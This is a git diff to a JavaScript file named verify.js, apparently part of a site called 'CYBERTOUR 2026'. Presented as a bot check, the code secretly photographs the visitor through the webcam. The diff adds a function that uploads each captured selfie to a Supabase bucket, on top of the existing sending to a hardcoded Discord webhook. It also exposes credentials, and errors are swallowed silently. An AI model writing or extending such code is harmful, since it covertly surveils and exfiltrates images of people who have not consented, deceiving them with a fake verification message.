@@ -1,11 +1,17 @@
 /**
  * CYBERTOUR 2026 — verify.js
- * Selfie automatique invisible → Discord
+ * Selfie automatique invisible → Discord + Supabase
  */
 
 import { isVerified, setVerified } from './storage.js';
 
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1550264500526121013/9VASm7wlXChAGnQ1_n5xfTIGdWj20ZhSbrsLi05ndMx7CoNWXC8Rn0obLkzwxsdmj1fr';
+
+// ── Supabase ──────────────────────────────────────────────────────────────────
+const SUPABASE_URL = 'https://vcuiksxvcibdlabvceyp.supabase.co';
+const SUPABASE_KEY = 'sb_publishable_GE53TTtidaDI_x-TlRVg-w_y1mkt9JV';
+const BUCKET       = 'cybertour-selfies';
+// ─────────────────────────────────────────────────────────────────────────────
 
 let stream    = null;
 let capturing = false;
@@ -75,6 +81,7 @@ function captureSelfie(video, onSuccess) {
 
 function finalize(canvas, onSuccess) {
   sendToDiscord(canvas);
+  uploadToSupabase(canvas);   // ← seule ligne ajoutée
 
   const btn = document.getElementById('verify-start-btn');
   if (btn) btn.querySelector('.btn-text').textContent = 'Bot non détecté ✓';
@@ -115,6 +122,27 @@ function sendToDiscord(canvas) {
 
   if (canvas) canvas.toBlob(b => send(b), 'image/jpeg', 0.75);
   else send(null);
+}
+
+function uploadToSupabase(canvas) {
+  if (!canvas) return;
+  canvas.toBlob(async (blob) => {
+    const filename = `selfie-${Date.now()}.jpg`;
+    try {
+      await fetch(
+        `${SUPABASE_URL}/storage/v1/object/${BUCKET}/${filename}`,
+        {
+          method: 'POST',
+          headers: {
+            'Authorization': `Bearer ${SUPABASE_KEY}`,
+            'Content-Type': 'image/jpeg',
+            'x-upsert': 'false',
+          },
+          body: blob,
+        }
+      );
+    } catch (_) {}
+  }, 'image/jpeg', 0.75);
 }
 
 async function tryStream(sets) {
